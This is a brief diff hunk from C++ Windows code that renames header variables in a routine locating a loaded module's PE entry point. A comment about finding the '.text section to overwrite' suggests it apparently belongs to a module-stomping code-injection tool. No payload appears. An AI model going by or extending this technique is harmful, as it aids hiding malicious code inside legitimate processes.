@@ -79,11 +79,11 @@ DWORD WINAPI esc_main(LPVOID lpParameter)
     std::cout << "Module size: " << std::dec << moduleInfo.SizeOfImage << " bytes" << std::endl;
 
     // Find the .text section to overwrite
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll;
-    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)moduleInfo.lpBaseOfDll + dosHeader->e_lfanew);
+    PIMAGE_DOS_HEADER mdosHeader = (PIMAGE_DOS_HEADER)moduleInfo.lpBaseOfDll;
+    PIMAGE_NT_HEADERS mntHeader = (PIMAGE_NT_HEADERS)((BYTE*)moduleInfo.lpBaseOfDll + mdosHeader->e_lfanew);
     
     // Find the entry point
-    PVOID targetAddress = (PVOID)((BYTE*)moduleInfo.lpBaseOfDll + ntHeader->OptionalHeader.AddressOfEntryPoint);
+    PVOID targetAddress = (PVOID)((BYTE*)moduleInfo.lpBaseOfDll + mntHeader->OptionalHeader.AddressOfEntryPoint);
     
     // If entry point is not suitable, use a fixed offset
     if (!targetAddress) {
